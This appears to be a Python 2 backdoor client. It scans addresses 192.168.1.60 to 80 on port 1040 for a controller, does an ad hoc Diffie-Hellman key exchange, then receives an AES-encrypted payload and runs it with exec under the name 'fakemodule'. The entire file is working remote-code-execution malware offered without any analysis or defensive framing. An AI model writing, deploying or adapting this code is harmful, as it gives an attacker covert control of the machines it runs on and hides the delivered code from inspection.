import socket, os, base64, subprocess, threading, time, random
from Crypto.Cipher import AES
from Crypto import Random


###Setup Encriptor
primeN = 3534635645620271361541209209607897224734887106182307093292005188843884213420695035531516325888970426873310130582000012467805106432116010499008974138677724241907444538851271730464985654882214412422106879451855659755824580313513382070785777831859308900851761495284515874808406228585310317964648830289141496328996622685469256041007506727884038380871660866837794704723632316890465023570092246473915442026549955865931709542468648109541
privateBB = random.randint(0, primeN)
publicBB = pow(2, privateBB, primeN)


def encriptionKey(x):
    privateB = privateBB
    publicB = publicBB
    sock.sendall(str(publicB))
    publicA = sock.recv(1024)
    encriptionkey = str(pow(int(publicA), privateB, primeN))
    enckey = str(encriptionkey)[4:36]
    return enckey


def pad(s):
    return s + b"\0" * (AES.block_size - len(s) % AES.block_size)



def decriptStrings(x):
    iv = x[:AES.block_size]
    cipher = AES.new(encriptKey, AES.MODE_CBC, iv)
    plaintext = cipher.decrypt(x[AES.block_size:])
    return plaintext.rstrip(b"\0")


ippre = '192.168.1.'
ipset = 60
ip = ippre + str(ipset)
out = ''
fin = 0

while True:

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        sock.settimeout(0.2)
        sock.connect((ip, 1040))
        sock.settimeout(None)
        encriptKey = ""
        encriptKey = encriptionKey(encriptKey)
        print "1"
        try:
            exec (compile(decriptStrings(sock.recv(1048576)), 'fakemodule', 'exec'))
        except SyntaxError as err:
            print err.lineno
            print err
        print "2"
    except:
        print ("No connection on " + ip)
        ipset += 1
        if ipset == 81:
            ipset = 60
        ip = ippre + str(ipset)
        pass
